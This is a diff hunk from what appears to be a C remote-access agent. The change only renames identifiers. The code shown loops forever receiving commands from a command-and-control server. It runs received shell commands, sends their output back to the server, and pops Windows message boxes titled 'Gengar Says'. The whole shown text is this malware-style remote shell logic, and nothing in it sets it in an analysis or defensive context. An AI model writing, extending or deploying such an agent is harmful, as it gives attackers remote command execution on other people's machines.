@@ -9,35 +9,35 @@
 #define MSGBOX_BUFSIZE 128
 #define SHELL_BUFSIZE 4096
 
-enum cmdtypes { shell, msgbox };
+enum cmd_types { shell, msgbox };
 
 void handle_shell() {
   char *cmd, *out;
-  cmd = recvfromcnc(SHELL_BUFSIZE);
+  cmd = recv_from_cnc(SHELL_BUFSIZE);
   printf("Executing shell command: %s\n", cmd);
   out = run(cmd);
   free(cmd);
-  sendtocnc(out);
+  send_to_cnc(out);
   free(out);
 }
 
 void handle_msgbox() {
   char *msg;
-  msg = recvfromcnc(MSGBOX_BUFSIZE);
+  msg = recv_from_cnc(MSGBOX_BUFSIZE);
   printf("Popping MessageBox: %s", msg);
   MessageBox(NULL, msg, "Gengar Says", 0);
   free(msg);
 }
 
-void startagent() {
+void start_agent() {
   char *res;
 
   while (1) {
-    res = recvfromcnc(CMDTYPE_BUFSIZE);
-    enum cmdtypes cmdtype = (int)res[0];
+    res = recv_from_cnc(CMDTYPE_BUFSIZE);
+    enum cmd_types cmd_type = (int)res[0];
     free(res);
 
-    switch (cmdtype) {
+    switch (cmd_type) {
       case shell:
         handle_shell();
         break;
